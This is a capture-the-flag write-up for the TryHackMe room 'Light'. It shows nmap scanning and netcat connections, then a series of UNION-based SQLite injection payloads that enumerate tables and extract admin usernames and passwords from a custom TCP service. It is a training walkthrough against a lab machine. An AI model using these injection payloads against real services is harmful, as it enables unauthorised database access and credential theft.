# CTF Write-up: Light — TryHackMe

| | |
|---|---|
| **Platform**   | TryHackMe |
| **Machine**    | Light |
| **Difficulty** | Easy |
| **Tags**       | `SQLite` `SQL Injection` `UNION SELECT` `Custom Service` |

---

## Introduction

Light is a deceptively simple room that teaches something important: SQL injection isn't just a web application problem. Here, the target is a custom database application running on a raw TCP port, not a website. The room gives you a starting credential right in the hint, but the real work begins when you realise those credentials are a red herring and that the service itself is the attack surface. It's a neat introduction to SQLite enumeration through blind injection.

---

## Step 1 — Reconnaissance (Nmap)

```bash
nmap -p- -A -T4 <target-ip>
```

Two ports came back:

- **Port 22** — SSH
- **Port 1337** — Custom service (the "Light" database application)

The hint in the room confirmed the application was reachable on port 1337 using Netcat and suggested using the username "smokey" to start.

---

## Step 2 — Connecting to the Service

```bash
nc <target-ip> 1337
```

The service prompted for a username. Entered "smokey" and received a password back. Naturally, the first instinct was to try those credentials on SSH. No luck — SSH wasn't going to cooperate.

Coming back to port 1337 with a fresh perspective: the hint mentioned a "Light database application." That points to SQLite. If the service queries a SQLite database based on user input, it might be injectable.

---

## Step 3 — Confirming SQL Injection

Sent a single quote to test for SQL errors:

```bash
echo "'" | nc <target-ip> 1337
```

Got an error back. SQLite confirmed the input was being processed unsanitised. Time to exploit it properly.

Tested a basic OR condition:

```bash
echo "' OR '1'='1" | nc <target-ip> 1337
```

Returned a password. SQL injection was working. (Note: the double-dash comment syntax was being filtered, so I dropped it and worked with the OR condition directly.)

---

## Step 4 — Enumerating the Database Structure

With injection confirmed, I needed to understand the database layout. SQLite stores its schema in a table called `sqlite_master`. UNION SELECT statements let you pull data from other tables alongside query results.

Getting the table names:

```bash
echo "smokey' Union Select name FROM sqlite_master WHERE type='table" | nc <target-ip> 1337
```

Result: `admintable`

Getting the column structure of `admintable`:

```bash
echo "smokey' Union Select sql FROM sqlite_master WHERE name='admintable" | nc <target-ip> 1337
```

Column names came back — the table had `username` and `password` columns.

Checking how many records were in there:

```bash
echo "smokey' Union Select COUNT(username) FROM admintable WHERE 1'" | nc <target-ip> 1337
```

Two entries.

---

## Step 5 — Extracting Credentials & Flags

Pulled the first admin username:

```bash
echo "smokey' Union Select username FROM admintable WHERE username LIKE '%" | nc <target-ip> 1337
```

Got the first admin username (`UserAdmin_1`).

Got their password:

```bash
echo "smokey' Union Select password FROM admintable WHERE username='<UserAdmin_1>'" | nc <target-ip> 1337
```

Then retrieved the second admin:

```bash
echo "smokey' Union Select username FROM admintable WHERE username!='<UserAdmin_1>'" | nc <target-ip> 1337
```

And finally their password:

```bash
echo "smokey' Union Select password FROM admintable WHERE username='<UserAdmin_2>'" | nc <target-ip> 1337
```

The second admin's password was the flag itself.

> **FLAG:** `[flag here]`

---

## Summary & Takeaways

Light keeps things refreshingly minimal:

1. Custom TCP service on port 1337 running a SQLite database app.
2. The given "smokey" credentials were a red herring — focus on injecting the service itself.
3. UNION-based SQLite injection to enumerate tables, columns, and finally extract the admin credentials that contained the flag.

The room is a good reminder that SQL injection doesn't live exclusively in web forms — any service that accepts user input and queries a database without proper sanitisation is fair game.
